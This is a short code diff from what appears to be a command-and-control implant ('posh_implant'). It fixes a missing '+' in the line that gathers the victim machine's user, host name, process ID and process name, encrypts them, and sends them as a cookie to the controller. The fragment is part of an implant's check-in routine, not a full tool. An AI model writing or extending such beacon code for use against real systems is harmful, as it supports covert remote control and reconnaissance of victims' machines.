@@ -133,7 +133,7 @@ function primern(url) {
     } else {
         el = "";
     }
-    let o = posh_implant.cu + el + ';' + posh_implant.host + ';' + posh_implant.pid ';' + posh_implant.procName +';#REPLACEURLID#';
+    let o = posh_implant.cu + el + ';' + posh_implant.host + ';' + posh_implant.pid + ';' + posh_implant.procName +';#REPLACEURLID#';
     // Encrypt o and set as cookie
     let cookie = enc(o);
     primern = get_webclient(cookie);
